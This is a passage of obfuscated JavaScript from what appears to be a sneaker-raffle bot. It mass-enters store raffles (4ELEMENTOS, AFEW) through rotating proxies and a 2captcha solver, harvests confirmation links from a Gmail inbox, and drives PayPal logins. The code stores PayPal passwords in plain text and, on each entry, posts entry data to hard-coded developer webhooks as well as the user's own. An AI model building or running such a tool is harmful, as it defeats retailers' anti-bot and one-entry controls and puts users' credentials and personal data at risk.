        if (_0x47f642['Option'] < _0x58ea0a['length'])
            return _0x58ea0a[_0x47f642['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x11d262 = {}, _0x511951 = await _0x240076['get']('Email');
        _0x11d262['Email'] = _0x511951['Email'];
        var _0x35cdac = Math['round'](Math['random']() * (_0x883492['length'] - 0x1));
        _0x11d262['Proxy'] = _0x883492[_0x35cdac], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x28414f = await _0x240076['get']('Password');
        return _0x11d262['Password'] = _0x28414f['Password'], _0x57b36f['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x11d262['Email'] + ',' + _0x11d262['Password'] + ',' + _0x11d262['Proxy']), _0x11d262;
    }
    let _0x37c4ec = await _0x360993();
    var _0x3884e6 = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x5eb652 = await _0x240076['get']('Amount'), _0x52b962 = _0x5eb652['Amount'];
    async function _0x6ab76a() {
        let _0x3d7eae = 0x0;
        var _0x187c50 = new _0x10db71({
            'user': _0x1d78d4['masterMail'],
            'password': _0x1d78d4['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x4acbb7(_0x30cc30) {
            _0x187c50['openBox']('INBOX', ![], _0x30cc30);
        }
        _0x187c50['once']('ready', function () {
            _0x4acbb7(function (_0x39a95e, _0x3b7c08) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x39a95e)
                    throw _0x39a95e;
                _0x187c50['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x2ed73d, _0x27beff) {
                    if (!_0x27beff || !_0x27beff['length'])
                        console['log'](_0x4ea3c7() + '\x20[' + _0x27d890 + ']\x20No\x20mails\x20found'), _0x187c50['end']();
                    else {
                        _0x27beff = _0x27beff['slice'](0x0, _0x52b962);
                        var _0x3c1220 = _0x187c50['seq']['fetch'](_0x27beff, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x3c1220['on']('message', function (_0x305ce9, _0x370c85) {
                            var _0x1fd273 = '(#' + _0x370c85 + ')\x20';
                            _0x305ce9['on']('body', function (_0x1f6909, _0x4f36a3) {
                                _0xd18e10(_0x1f6909, (_0x34c9f9, _0x201ea4) => {
                                    if (_0x201ea4['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x201ea4['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x201ea4['text']['split']('[')[0x2];
                                        var _0x180041 = mes['split'](']')[0x0];
                                        _0x3884e6['push'](_0x180041);
                                    }
                                });
                            }), _0x305ce9['once']('end', function () {
                                _0x3d7eae++;
                            });
                        }), _0x3c1220['once']('error', function (_0xc468d1) {
                            console['log']('Fetch\x20error:\x20' + _0xc468d1);
                        }), _0x3c1220['once']('end', function () {
                            _0x187c50['end']();
                        });
                    }
                });
            });
        }), _0x187c50['once']('error', function (_0x1fd143) {
            console['log'](_0x11085b['red'](_0x1fd143['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x187c50['once']('end', async function () {
        }), _0x187c50['connect']();
    }
    try {
        _0x6ab76a(), await _0x73bf2c(0xfa0), console['log']('Found\x20' + _0x3884e6['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x73bf2c(0xfa0);
    }
    var _0x251ca5;
    _0x3ec78c('' + _0x27d890);
    var _0x461e4e = _0x37c4ec['Proxy']['split'](':'), _0x5d854c;
    try {
        _0x5d854c = await _0x1f8a8f['launch']({
            'userDataDir': 'sessions/' + _0x37c4ec['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x461e4e[0x0] + ':' + _0x461e4e[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x5d854c = await _0x1f8a8f['launch']({
            'userDataDir': 'sessions/' + _0x37c4ec['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x461e4e[0x0] + ':' + _0x461e4e[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x4ea3c7() + '\x20[' + _0x27d890 + ']\x20Getting\x20Session');
        const _0x1d78e8 = await _0x5d854c['newPage']();
        await _0x1d78e8['authenticate']({
            'username': '' + _0x461e4e[0x2],
            'password': '' + _0x461e4e[0x3]
        }), await _0x1d78e8['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x1d78e8['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x4ea3c7() + '\x20[' + _0x27d890 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x1d78e8['waitForSelector']('#email');
            let _0x53a1e5 = await _0x1d78e8['$eval']('#email', _0x4e3e51 => _0x4e3e51['getAttribute']('value'));
            if (_0x53a1e5 == '') {
                await _0x1d78e8['type']('#email', _0x37c4ec['Email']), await _0x73bf2c(0x1d3);
                let _0x5cc145 = await _0x1d78e8['$']('#splitPassword');
                _0x5cc145 && (await _0x1d78e8['click']('#btnNext'), await _0x73bf2c(0xa28)), await _0x1d78e8['type']('#password', _0x37c4ec['Password']), await _0x73bf2c(0x35c), await _0x1d78e8['click']('#btnLogin');
            } else
                await _0x1d78e8['type']('#password', _0x37c4ec['Password']), await _0x73bf2c(0x35c), await _0x1d78e8['click']('#btnLogin');
            await _0x1d78e8['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x4ea3c7() + '\x20[' + _0x27d890 + ']\x20Successfully\x20logged\x20in'), await _0x73bf2c(0x2710);
        } catch (_0xb97b8f) {
            throw new Error('Login\x20session\x20expired\x20' + _0xb97b8f);
        }
        for (var _0x8cdce0 = 0x0; _0x8cdce0 < _0x3884e6['length']; _0x8cdce0++) {
            console['log'](_0x4ea3c7() + '\x20[' + _0x27d890 + ']\x20Task\x20' + (_0x8cdce0 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x3ec78c(_0x27d890 + '\x20Task\x20' + (_0x8cdce0 + 0x1) + '\x20/\x20' + _0x3884e6['length']);
            const _0x12715e = await _0x5d854c['newPage']();
            await _0x12715e['goto']('' + _0x3884e6[_0x8cdce0], { 'waitUntil': 'networkidle2' }), await _0x73bf2c(0xbb8);
            try {
                const _0x50794d = await _0x12715e['$']('#challenge-heading');
                _0x50794d && (console['log'](_0x4ea3c7() + '\x20[' + _0x27d890 + ']\x20Task\x20' + (_0x8cdce0 + 0x1) + '\x20:\x20' + _0x11085b['yellow']('2FA\x20Required')), await _0x12715e['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x73bf2c(0x9c40), await _0x12715e['waitForSelector']('#payment-submit-btn'), await _0x12715e['$eval']('#payment-submit-btn', _0x209817 => _0x209817['click']()), await _0x12715e['click']('#payment-submit-btn');
                try {
                    await _0x12715e['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x73bf2c(0x5dc), console['log'](_0x11085b['green'](_0x4ea3c7() + '\x20[' + _0x27d890 + ']\x20Task\x20' + (_0x8cdce0 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x19ab34) {
                    _0x40ca6a = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x19ab34['message']);
                } finally {
                    if (_0x40ca6a == 'yes' && _0x5b0f21 != 0x2) {
                        console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x27d890['name'] + ']\x20Task\x20' + (_0x8cdce0 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5b0f21 + '\x20/\x205)')), _0x8cdce0 = _0x8cdce0 - 0x1, _0x5b0f21 = _0x5b0f21 + 0x1;
                        continue;
                    }
                    _0x40ca6a == 'yes' && _0x5b0f21 >= 0x2 && (_0x3fe3d2(csv[_0x8cdce0], _0x27d890), _0x40ca6a = 'no', _0x5b0f21 = 0x0), await _0x12715e['close'](), await _0x73bf2c(0x4650);
                }
            } catch (_0x2f322b) {
                console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x27d890 + ']\x20Task\x20' + (_0x8cdce0 + 0x1) + '\x20:\x20' + _0x2f322b));
            }
        }
    } catch (_0x2beb8f) {
        console['log'](_0x11085b['red']('' + _0x2beb8f));
    } finally {
        await _0x5d854c['close']();
    }
}
const _0x2e8dbc = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x5405d9, _0x40152e, _0x47af1c) {
                    _0x1f8a8f['use'](_0x2f231a()), _0x1f8a8f['use'](_0x561a9c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1d78d4['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x87db2c = 0x0; _0x87db2c < _0x40152e['length']; _0x87db2c++) {
                        if (_0x3a01ab != 'yes')
                            var _0x3a01ab = '', _0x1ba30f = 0x0;
                        var _0x3e5e2c;
                        try {
                            await _0x4b6344(_0x40152e, _0x87db2c);
                        } catch {
                            _0x3a01ab = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x3ec78c(_0x5405d9['name'] + '\x20Task\x20' + (_0x87db2c + 0x1) + '\x20/\x20' + _0x40152e['length'] + '\x20||\x20File:\x20' + _0x3fcfb6 + '\x20Proxies:\x20' + _0x1a359b);
                        var _0x8c710e = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x19da7c = Math['round'](Math['random']() * (_0x8c710e['length'] - 0x1));
                        _0x40152e[_0x87db2c]['Size'] == 'RANDOM' && (_0x40152e[_0x87db2c]['Size'] = _0x8c710e[_0x19da7c]);
                        var _0x22f441 = Math['round'](Math['random']() * (_0x47af1c['length'] - 0x1)), _0x1ad20e = _0x47af1c[_0x22f441]['split'](':'), _0x282d01;
                        try {
                            _0x282d01 = await _0x1f8a8f['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1ad20e[0x0] + ':' + _0x1ad20e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x282d01 = await _0x1f8a8f['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1ad20e[0x0] + ':' + _0x1ad20e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x4ea3c7() + '\x20[' + _0x5405d9['name'] + ']\x20Task\x20' + (_0x87db2c + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x387430 = await _0x282d01['newPage']();
                            await _0x387430['authenticate']({
                                'username': '' + _0x1ad20e[0x2],
                                'password': '' + _0x1ad20e[0x3]
                            }), await _0x387430['setRequestInterception'](!![]), _0x387430['on']('request', _0x284633 => {
                                _0x284633['resourceType']() === 'image' || _0x284633['resourceType']() === 'font' || _0x284633['resourceType']() === 'media' ? _0x284633['abort']() : _0x284633['continue']();
                            }), await _0x387430['goto'](_0x40152e[_0x87db2c]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x4ea3c7() + '\x20[' + _0x5405d9['name'] + ']\x20Task\x20' + (_0x87db2c + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x387430['waitForSelector']('#accept-all-gdpr'), await _0x387430['click']('#accept-all-gdpr'), await _0x387430['waitForSelector']('#raffles-product'), await _0x73bf2c(0x3e8), await _0x387430['$eval']('#raffles-product', _0x521bb7 => _0x521bb7['click']()), await _0x73bf2c(0x1388), await _0x387430['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x3b53fa = await _0x387430['$']('.fancybox-inner\x20>\x20iframe'), _0x600bb2 = await _0x3b53fa['contentFrame']();
                            console['log'](_0x4ea3c7() + '\x20[' + _0x5405d9['name'] + ']\x20Task\x20' + (_0x87db2c + 0x1) + '\x20:\x20Checking\x20Information'), await _0x600bb2['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x73bf2c(0x1f4), await _0x600bb2['type']('input[name=\x22sm-form-email\x22]', _0x40152e[_0x87db2c]['Email']), await _0x73bf2c(0xc8), await _0x600bb2['type']('input[name=\x22sm-form-name\x22]', _0x40152e[_0x87db2c]['FirstName'] + '\x20' + _0x40152e[_0x87db2c]['LastName']), await _0x73bf2c(0xc8), await _0x600bb2['type']('input[name=\x22sm-form-street\x22]', _0x40152e[_0x87db2c]['Address1'] + '\x20' + _0x40152e[_0x87db2c]['HouseNumber'] + '\x20' + _0x40152e[_0x87db2c]['Address2']), await _0x73bf2c(0xc8), await _0x600bb2['type']('input[name=\x22sm-form-city\x22]', _0x40152e[_0x87db2c]['City']), await _0x73bf2c(0xc8), await _0x600bb2['type']('input[name=\x22sm-form-province\x22]', _0x40152e[_0x87db2c]['State']), await _0x73bf2c(0xc8), await _0x600bb2['type']('input[name=\x22sm-form-zip\x22]', _0x40152e[_0x87db2c]['Zip']), await _0x73bf2c(0xc8), await _0x600bb2['type']('input[name=\x22sm-form-country\x22]', _0x40152e[_0x87db2c]['Country']), await _0x73bf2c(0xc8), await _0x600bb2['type']('input[name=\x22sm-form-phone\x22]', _0x40152e[_0x87db2c]['Phone']), await _0x73bf2c(0xc8), await _0x600bb2['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x40152e[_0x87db2c]['Follower']), await _0x73bf2c(0xc8), await _0x600bb2['type']('input[name=\x22sm-cst.size\x22]', _0x40152e[_0x87db2c]['Size']), await _0x73bf2c(0x1f4), await _0x600bb2['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x73bf2c(0x1f4), await _0x600bb2['click']('.icheckbox_simple-custom'), await _0x73bf2c(0x1f4), console['log'](_0x4ea3c7() + '\x20[' + _0x5405d9['name'] + ']\x20Task\x20' + (_0x87db2c + 0x1) + '\x20:\x20Sending\x20Request'), await _0x600bb2['$eval']('form', _0x2f141b => _0x2f141b['submit']()), console['log'](_0x11085b['green'](_0x4ea3c7() + '\x20[' + _0x5405d9['name'] + ']\x20Task\x20' + (_0x87db2c + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x3a01ab = '';
                            var _0x3a43ac = await _0x1bd114(_0x40152e[_0x87db2c], _0x5405d9, 'dev', ![]), _0x418114 = await _0x1bd114(_0x40152e[_0x87db2c], _0x5405d9, 'pub', ![]);
                            const _0x14584c = {
                                'succesDEVMSG': { 'embeds': [_0x3a43ac] },
                                'succesPUBMSG': { 'embeds': [_0x418114] }
                            };
                            try {
                                _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x14584c['succesDEVMSG']), await _0x73bf2c(0xc8), await _0x5cd94d(_0x492271, _0x14584c['succesDEVMSG']), await _0x73bf2c(0xc8), await _0x5cd94d(_0x323e07, _0x14584c['succesPUBMSG']);
                            } catch (_0x3514a4) {
                                console['log'](_0x11085b['yellow'](_0x4ea3c7() + '\x20[' + _0x5405d9['name'] + ']\x20Task\x20' + (_0x87db2c + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x3514a4));
                            }
                        } catch (_0x771309) {
                            console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x5405d9['name'] + ']\x20Task\x20' + (_0x87db2c + 0x1) + '\x20:\x20' + _0x771309)), _0x3e5e2c = '' + _0x771309;
                            var _0x540302 = await _0x1bd114(_0x40152e[_0x87db2c], _0x5405d9, 'dev', !![], _0x3e5e2c), _0x3a43ac = await _0x1bd114(_0x40152e[_0x87db2c], _0x5405d9, 'dev', ![]), _0x418114 = await _0x1bd114(_0x40152e[_0x87db2c], _0x5405d9, 'pub', ![]);
                            const _0x5bd114 = {
                                'succesDEVMSG': { 'embeds': [_0x3a43ac] },
                                'succesPUBMSG': { 'embeds': [_0x418114] }
                            };
                            _0x5bd114['errorDEV'] = { 'embeds': [_0x540302] }, _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x5bd114['errorDEV']), await _0x5cd94d(_0xfda3c6, _0x5bd114['errorDEV']), _0x771309 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x3a01ab = 'yes');
                        } finally {
                            _0x282d01['close']();
                            if (_0x3a01ab == 'yes' && _0x1ba30f != 0x5 && _0x3e5e2c != 'Size\x20Not\x20Found') {
                                console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x5405d9['name'] + ']\x20Task\x20' + (_0x87db2c + 0x1) + '\x20:\x20Retrying\x20(' + _0x1ba30f + '\x20/\x205)\x20')), _0x87db2c = _0x87db2c - 0x1, _0x1ba30f = _0x1ba30f + 0x1;
                                continue;
                            }
                            _0x3a01ab == 'yes' && _0x1ba30f >= 0x5 && (_0x3fe3d2(_0x40152e[_0x87db2c], _0x5405d9), _0x3a01ab = 'no', _0x1ba30f = 0x0), console['log'](_0x4ea3c7() + '\x20[' + _0x5405d9['name'] + ']\x20Waiting\x20for\x20' + _0x1d78d4['delay'] + '\x20ms'), await _0x73bf2c(_0x1d78d4['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x9e3ab8, _0xd5672e) {
                    var _0x56ac76 = [];
                    async function _0x4e3a94() {
                        var _0x3546fa = new _0x10db71({
                            'user': _0x1d78d4['masterMail'],
                            'password': _0x1d78d4['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x202aa0(_0x281063) {
                            _0x3546fa['openBox']('INBOX', ![], _0x281063);
                        }
                        _0x3546fa['once']('ready', function () {
                            _0x202aa0(function (_0x35658d, _0x1fcb6c) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x35658d)
                                    throw _0x35658d;
                                _0x3546fa['seq']['search'](['UNSEEN'], function (_0x516e78, _0x52bb2b) {
                                    if (!_0x52bb2b || !_0x52bb2b['length'])
                                        console['log'](_0x4ea3c7() + '\x20[' + _0x9e3ab8['name'] + ']\x20No\x20mails\x20found'), _0x3546fa['end']();
                                    else {
                                        var _0x105da2 = _0x3546fa['seq']['fetch'](_0x52bb2b, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x105da2['on']('message', function (_0x163220, _0x3574fd) {
                                            var _0x5d0fe1 = '(#' + _0x3574fd + ')\x20';
                                            _0x163220['on']('body', function (_0x22dceb, _0x3245e9) {
                                                _0xd18e10(_0x22dceb, (_0x4279e4, _0x3fae12) => {
                                                    if (_0x3fae12['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x578c2d = _0x3fae12['html']['split']('\x0a');
                                                        for (var _0x5e39ee = 0x0; _0x5e39ee < _0x578c2d['length']; _0x5e39ee++) {
                                                            if (_0x578c2d[_0x5e39ee]['includes']('salesmanago') && _0x578c2d[_0x5e39ee]['includes']('<td') && _0x578c2d[_0x5e39ee]['includes']('href')) {
                                                                var _0x52cf57 = _0x578c2d[_0x5e39ee]['split']('href=\x22'), _0x905c67 = _0x52cf57[0x1]['split']('\x22')[0x0];
                                                                _0x56ac76['push'](_0x905c67);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x163220['once']('end', function () {
                                            });
                                        }), _0x105da2['once']('error', function (_0x382399) {
                                            console['log']('Fetch\x20error:\x20' + _0x382399);
                                        }), _0x105da2['once']('end', function () {
                                            _0x3546fa['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x3546fa['once']('error', function (_0x456fab) {
                            console['log'](_0x11085b['red'](_0x456fab['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x3546fa['once']('end', async function () {
                        }), _0x3546fa['connect']();
                    }
                    async function _0x31f852(_0x566dd5, _0x34b484, _0x5ed9bb) {
                        for (var _0x5d3c59 = 0x0; _0x5d3c59 < _0x34b484['length']; _0x5d3c59++) {
                            async function _0x388269(_0x4b551e, _0x5ebc5b, _0x3e4ba1, _0x13bbbd, _0x5bf7ce) {
                                var _0x547b8e, _0x37ede5 = {}, _0x3112f9 = [], _0x410606 = {}, _0x1277e6 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x4c25ce = Math['round'](Math['random']() * (_0x1277e6['length'] - 0x1));
                                _0x13bbbd[_0x4b551e]['Size'] == 'RANDOM' && (_0x13bbbd[_0x4b551e]['Size'] = _0x1277e6[_0x4c25ce]);
                                !_0x13bbbd && (_0x13bbbd = {});
                                if (_0x1d78d4['useRandomProxy'] = ![])
                                    var _0x361998 = _0x5bf7ce[_0x4b551e]['split'](':');
                                else
                                    var _0x1353de = Math['round'](Math['random']() * (_0x5bf7ce['length'] - 0x1)), _0x361998 = _0x5bf7ce[_0x1353de]['split'](':');
                                var _0x231bf3 = {
                                    'jar': _0x27c7cf,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x3e4ba1['url'],
                                    'headers': _0x3e4ba1['headers'],
                                    'body': JSON['stringify'](_0x37ede5),
                                    'proxy': 'http://' + _0x361998[0x2] + ':' + _0x361998[0x3] + '@' + _0x361998[0x0] + ':' + _0x361998[0x1]
                                };
                                return _0x5ebc5b != 'ver' && (_0x231bf3['url'] = _0x3e4ba1['url'], _0x231bf3['headers'] = _0x3e4ba1['headers']), _0x5ebc5b == 'ver' && (_0x231bf3['method'] = 'GET', _0x231bf3['url'] = _0x13bbbd[_0x4b551e]), new Promise(function (_0x1913b7, _0x5b0c42) {
                                    callback = async (_0x551406, _0x1dd3a2, _0x1b0519) => {
                                        if (!_0x551406 && _0x1dd3a2['statusCode'] == 0xca || !_0x551406 && _0x1dd3a2['statusCode'] == 0xc8) {
                                            if (_0x5ebc5b != 'ver') {
                                                var _0x1ec2d2 = await _0x1bd114(_0x13bbbd[_0x4b551e], _0x3e4ba1, 'dev', ![]), _0x18fdaf = await _0x1bd114(_0x13bbbd[_0x4b551e], _0x3e4ba1, 'pub', ![]);
                                                const _0x1ad671 = {
                                                    'succesDEVMSG': { 'embeds': [_0x1ec2d2] },
                                                    'succesPUBMSG': { 'embeds': [_0x18fdaf] }
                                                };
                                                if (_0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '')
                                                    try {
                                                        await _0x5cd94d(_0x1d78d4['webhook'], _0x1ad671['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x73bf2c(0xc8), await _0x5cd94d(_0x492271, _0x1ad671['succesDEVMSG']), await _0x73bf2c(0xc8);
                                                try {
                                                    await _0x5cd94d(_0x323e07, _0x1ad671['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x5584d0(_0x13bbbd[_0x4b551e], _0x3e4ba1);
                                            }
                                            _0x1913b7(console['log'](_0x11085b['green'](_0x4ea3c7() + '\x20[' + _0x3e4ba1['name'] + ']\x20Task\x20' + (_0x4b551e + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x5ebc5b != 'ver') {
                                                var _0x429f1d = '' + _0x551406, _0x43552e = await _0x1bd114(_0x13bbbd[_0x4b551e], _0x3e4ba1, 'dev', !![], _0x429f1d), _0x561657 = {};
                                                _0x561657['errorDEV'] = { 'embeds': [_0x43552e] }, _0x3fe3d2(_0x13bbbd[_0x4b551e], _0x3e4ba1), _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x561657['errorDEV']), await _0x5cd94d(_0xfda3c6, _0x561657['errorDEV']);
                                            }
                                            _0x5b0c42(console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x3e4ba1['name'] + ']\x20Task\x20' + (_0x4b551e + 0x1) + ':\x20' + _0x551406)));
                                        }
                                    };
                                    try {
                                        _0x5ebc5b != 'ver' ? console['log'](_0x4ea3c7() + '\x20[' + _0x3e4ba1['name'] + ']\x20Task\x20' + (_0x4b551e + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x37ede5['data']['attributes']['email']) : console['log'](_0x4ea3c7() + '\x20[' + _0x3e4ba1['name'] + ']\x20Task\x20' + (_0x4b551e + 0x1) + ':\x20Fetching\x20Response'), _0x31e459(_0x231bf3, callback);
                                    } catch (_0x3f7904) {
                                        console['log'](_0x4ea3c7() + '\x20Task\x20' + (_0x4b551e + 0x1) + ':\x20' + _0x3f7904);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x388269(_0x5d3c59, 'ver', _0x566dd5, _0x34b484, _0x5ed9bb), console['log'](_0x4ea3c7() + '\x20[' + _0x566dd5['name'] + ']\x20Sleeping\x20for\x20' + _0x1d78d4['delay'] + '\x20ms'), await _0x73bf2c(_0x1d78d4['delay']);
                            } catch (_0x195b84) {
                            }
                        }
                    }
                    try {
                        _0x4e3a94(), await _0x73bf2c(0xfa0), console['log']('Found\x20' + _0x56ac76['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x31f852(_0x9e3ab8, _0x56ac76, _0xd5672e);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x53c461, _0x579970, _0x5a33bf) {
                for (var _0x9afd70 = 0x0; _0x9afd70 < _0x579970['length']; _0x9afd70++) {
                    _0x1d78d4['AfewDelay'] = _0x1d78d4['delay'];
                    var _0x2219f7;
                    if (_0x4f4cf2 != 'yes')
                        var _0x4f4cf2 = '', _0x2c449c = 0x0;
                    var _0x398e13 = _0x579970[_0x9afd70]['Url'], _0x1a928a = _0x579970[_0x9afd70];
                    _0x3ec78c(_0x53c461['name'] + '\x20Task\x20' + (_0x9afd70 + 0x1) + '\x20/\x20' + _0x579970['length'] + '\x20||\x20File:\x20' + _0x3fcfb6 + '\x20Proxies:\x20' + _0x1a359b);
                    try {
                        await _0x4b6344(_0x579970, _0x9afd70);
                    } catch {
                        _0x4f4cf2 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x14bd7d(_0x1fb85a) {
                        const _0x131b64 = _0x57b36f['readFileSync']('../successful-tasks.csv', 'utf8'), _0x512cf3 = _0x296e07['parse'](_0x131b64, { 'header': !![] })['data'];
                        let _0x34dc11 = ![];
                        for (var _0x3b0573 of _0x512cf3) {
                            if (_0x3b0573['Url'] == _0x1fb85a['Url'] && _0x3b0573['Email'] == _0x1fb85a['Email']) {
                                _0x34dc11 = !![];
                                break;
                            }
                        }
                        return _0x34dc11;
                    }
                    if (await _0x14bd7d(_0x579970[_0x9afd70]) == !![]) {
                        console['log'](_0x4ea3c7() + '\x20[' + _0x53c461['name'] + ']\x20Task\x20' + (_0x9afd70 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x29f03e = await _0x1bd114(_0x579970[_0x9afd70], _0x53c461, 'dev', ![]), _0x4ffe02 = await _0x1bd114(_0x579970[_0x9afd70], _0x53c461, 'pub', ![]);
                    const _0x144106 = {
                        'succesDEVMSG': { 'embeds': [_0x29f03e] },
                        'succesPUBMSG': { 'embeds': [_0x4ffe02] }
                    };
                    if (_0x579970[_0x9afd70]['Email'] == '' || _0x579970[_0x9afd70]['FirstName'] == '' || _0x579970[_0x9afd70]['LastName'] == '' || _0x579970[_0x9afd70]['Country'] == '' || _0x579970[_0x9afd70]['Size'] == '' || _0x579970[_0x9afd70]['Address1'] == '' || _0x579970[_0x9afd70]['Zip'] == '') {
                        console['log'](_0x4ea3c7() + '\x20[' + _0x53c461['name'] + ']\x20Task\x20' + (_0x9afd70 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x1d78d4['useRandomProxy'] = ![])
                        var _0x310684 = _0x5a33bf[_0x9afd70]['split'](':');
                    else
